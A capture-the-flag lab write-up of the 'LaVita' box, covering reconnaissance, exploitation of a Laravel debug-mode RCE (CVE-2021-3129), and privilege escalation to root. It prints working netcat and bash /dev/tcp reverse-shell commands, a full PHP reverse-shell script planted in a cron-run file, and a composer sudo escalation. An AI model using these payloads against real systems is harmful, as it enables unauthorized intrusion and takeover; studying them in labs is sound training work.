# CTF Writeup: LaVita

---

## Reconaissance

An initial scan revealed the following information about running services on the target system.

```
nmap -A -p- --min-rate 10000 192.168.237.38
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-29 01:59 EST
Nmap scan report for 192.168.237.38
Host is up (0.029s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u2 (protocol 2.0)
| ssh-hostkey: 
|   3072 c9:c3:da:15:28:3b:f1:f8:9a:36:df:4d:36:6b:a7:44 (RSA)
|   256 26:03:2b:f6:da:90:1d:1b:ec:8d:8f:8d:1e:7e:3d:6b (ECDSA)
|_  256 fb:43:b2:b0:19:2f:d3:f6:bc:aa:60:67:ab:c1:af:37 (ED25519)
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: W3.CSS Template
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 554/tcp)
HOP RTT      ADDRESS
1   28.06 ms 192.168.45.1
2   28.12 ms 192.168.45.254
3   28.15 ms 192.168.251.1
4   28.14 ms 192.168.237.38

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.05 seconds
```

After Enumerating Endpoints, we retrieved an interesting endpoint called "_ignition/execution-solution.

Upon accessing it, we get an 404 error not found with Version Information about "Laravel 8.4.0".


Mapped target ip to domain "lavita.pg" in our local dns file /etc/hosts.

```
sudo echo "192.168.237.38 lavita.pg" | sudo tee -a /etc/hosts
```

Enumerated subdomains. But wasn't able to find anything.

```
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://lavita.pg -H "Host: FUZZ.lavita.pg" -fs 15130-15180

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://lavita.pg
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt
 :: Header           : Host: FUZZ.lavita.pg
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 15130-15180
________________________________________________

[WARN] Caught keyboard interrupt (Ctrl-C)
```

I registered an account saitama:password 
and logged into the CMS.

There seems to be an interesting "APP_DEBUG" mode, which we can enable & disable. Although there is no deep functionality which we can manually exploit. Let's search up for CVE's on laravel!

```
searchsploit laravel  
------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                              |  Path
------------------------------------------------------------------------------------------------------------ ---------------------------------
Aimeos Laravel ecommerce platform 2021.10 LTS - 'sort' SQL injection                                        | php/webapps/50538.txt
Laravel - 'Hash::make()' Password Truncation Security                                                       | multiple/remote/39318.txt
Laravel 8.4.2 debug mode - Remote code execution                                                            | php/webapps/49424.py
Laravel Administrator 4 - Unrestricted File Upload (Authenticated)                                          | php/webapps/49112.py
Laravel Framework 11 - Credential Leakage                                                                   | php/webapps/52000.txt
Laravel Log Viewer < 0.13.0 - Local File Download                                                           | php/webapps/44343.py
Laravel Nova 3.7.0 - 'range' DoS                                                                            | php/webapps/49198.txt
Laravel Pulse 1.3.1 - Arbitrary Code Injection                                                              | php/webapps/52319.py
Laravel Valet 2.0.3 - Local Privilege Escalation (macOS)                                                    | macos/local/50591.py
PHP Laravel 8.70.1 - Cross Site Scripting (XSS) to Cross Site Request Forgery (CSRF)                        | php/webapps/50525.txt
PHP Laravel Framework 5.5.40 / 5.6.x < 5.6.30 - token Unserialize Remote Command Execution (Metasploit)     | linux/remote/47129.rb
UniSharp Laravel File Manager 2.0.0 - Arbitrary File Read                                                   | php/webapps/48166.txt
UniSharp Laravel File Manager 2.0.0-alpha7 - Arbitrary File Upload                                          | php/webapps/46389.py
------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

The RCE Exploit seems very promising, let's download it manually.

```
git clone https://github.com/nth347/CVE-2021-3129_exploit.git
```

Ran the following command in order to test if the exploit works and it does!

```
python3 exploit.py http://lavita.pg Monolog/RCE1 "id"                                  
/home/saitama/Desktop/Exploiting/OSCP_Prep/ProvingGrounds/Linux/LaVita/CVE-2021-3129_exploit/exploit.py:77: SyntaxWarning: invalid escape sequence '\s'
  result = re.sub("{[\s\S]*}", "", response.text)
[i] Trying to clear logs
[+] Logs cleared
[i] PHPGGC not found. Cloning it
Cloning into 'phpggc'...
remote: Enumerating objects: 4860, done.
remote: Counting objects: 100% (893/893), done.
remote: Compressing objects: 100% (325/325), done.
remote: Total 4860 (delta 676), reused 573 (delta 568), pack-reused 3967 (from 3)
Receiving objects: 100% (4860/4860), 707.69 KiB | 5.05 MiB/s, done.
Resolving deltas: 100% (2220/2220), done.
[+] Successfully converted logs to PHAR
[+] PHAR deserialized. Exploited

uid=33(www-data) gid=33(www-data) groups=33(www-data)

[i] Trying to clear logs
[+] Logs cleared
```

Starting up my listener on port 80.

```
nc -lvnp 80
```

Executed netcat reverse connection with the exploit.

```
python3 exploit.py http://lavita.pg Monolog/RCE1 "nc 192.168.45.164 80 -e /bin/bash"
/home/saitama/Desktop/Exploiting/OSCP_Prep/ProvingGrounds/Linux/LaVita/CVE-2021-3129_exploit/exploit.py:77: SyntaxWarning: invalid escape sequence '\s'
  result = re.sub("{[\s\S]*}", "", response.text)
[i] Trying to clear logs
[+] Logs cleared
[+] PHPGGC found. Generating payload and deploy it to the target
[+] Successfully converted logs to PHAR
```

Gained RCE as user "www-data".

```
nc -lvnp 80
listening on [any] 80 ...
connect to [192.168.45.164] from (UNKNOWN) [192.168.237.38] 45660
```

Retrieved local.txt in /home/skunk directory.

```
f413079ece931b6c8f7a64d89fdae057
```

## Privilege Escalation

Performed Shell Hardening.

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
CTRL + Z
stty raw -echo ; fg ; reset
stty columns 200 rows 200
export TERM=xterm
```

Enumerated sudo version.

```
www-data@debian:/home/skunk$ sudo -V
Sudo version 1.9.5p2
Sudoers policy plugin version 1.9.5p2
Sudoers file grammar version 48
Sudoers I/O plugin version 1.9.5p2
Sudoers audit plugin version 1.9.5p2
```

Analyzed running processes with pspy32.

```
www-data@debian:/tmp$ ./pspy32 
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2025/12/29 03:32:41 CMD: UID=0     PID=1      | /sbin/init 
2025/12/29 03:33:01 CMD: UID=0     PID=2656   | /usr/sbin/CRON -f 
2025/12/29 03:33:01 CMD: UID=0     PID=2657   | /usr/sbin/CRON -f 
2025/12/29 03:33:01 CMD: UID=1001  PID=2658   | /usr/bin/php /var/www/html/lavita/artisan clear:pictures 
2025/12/29 03:33:01 CMD: UID=1001  PID=2659   | /usr/bin/php /var/www/html/lavita/artisan clear:pictures 
2025/12/29 03:33:01 CMD: UID=1001  PID=2661   | sh -c stty -a | grep columns 
2025/12/29 03:33:01 CMD: UID=1001  PID=2660   | 
2025/12/29 03:33:01 CMD: UID=1001  PID=2662   | /usr/bin/php /var/www/html/lavita/artisan clear:pictures 
2025/12/29 03:33:01 CMD: UID=1001  PID=2664   | sh -c stty -a | grep columns 
2025/12/29 03:33:01 CMD: UID=1001  PID=2663   | stty -a 
2025/12/29 03:33:01 CMD: UID=1001  PID=2665   | /usr/bin/php /var/www/html/lavita/artisan clear:pictures 
2025/12/29 03:33:01 CMD: UID=1001  PID=2666   | rm -Rf /var/www/html/lavita/public/images/*
```

There seems to be an binary executed on a cronjob called "artisan". in /var/www/html/lavita
This directory is writable, so we can just move the artisan file into another directory & replace it with an reverse shell of us. The UID of the process isn't from root, it's from another user called "skunk".

Started up my listener on port 22.

```
nc -lvnp 22
```

Changed name of the original artisan file in/var/www/html/lavita.

```
mv artisan artisan.backup
```

Created malicious payload called "artisan" in /var/www/html/lavita

```
cat artisan
#!/bin/bash

/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.164/22 0>&1'
```

Gave the exploit executable permissions.

```
chmod +x artisan
```

We should technically retrieve RCE after some time as user "skunk", since the running cronjob will execute our script with UID=1001.

After further analysis, I think I have to utilize an php reverse shell, not an bash reverse shell since the binary get's executed with php.

```
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '192.168.45.164';  // CHANGE THIS
$port = 22;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?> 
```

Gained RCE as user "skunk".

```
nc -lvnp 22
listening on [any] 22 ...
connect to [192.168.45.164] from (UNKNOWN) [192.168.237.38] 35978
Linux debian 5.10.0-25-amd64 #1 SMP Debian 5.10.191-1 (2023-08-16) x86_64 GNU/Linux
 03:42:01 up  1:46,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1001(skunk) gid=1001(skunk) groups=1001(skunk),27(sudo),33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
skunk
```

Checked which sudo permissions I have, user "skunk" is able to run 

```
skunk@debian:/var/www/html/lavita$ sudo -l
Matching Defaults entries for skunk on debian:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User skunk may run the following commands on debian:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/composer --working-dir\=/var/www/html/lavita *
```

Analyzing the composer binary on gtfobins. We can see that there is an PoC existing for sudo permissions.

```
echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' > composer.json
sudo composer --working-dir=/var/www/html/lavita x
```

This creates an malicious script called "x" and puts it inside the /var/www/html/lavita/composer.json file.

We can then run composer with sudo perms to achieve root perms.

I had to step into the www-data user, because user "skunk" doesn't have write permissions on /var/www/html/lavita.

```
echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' > composer.json
```

Went into shell from user "skunk" and ran the following exploit to gain RCE as user "root".

```
skunk@debian:/$ sudo composer --working-dir=/var/www/html/lavita x
Do not run Composer as root/super user! See https://getcomposer.org/root for details
Continue as root/super user [yes]? yes
> /bin/sh -i 0<&3 1>&3 2>&3
# whoami
root
```

Retrieved proof.txt in /root directory.


```
15eb14c48f84b71c160ced3856780e69
```

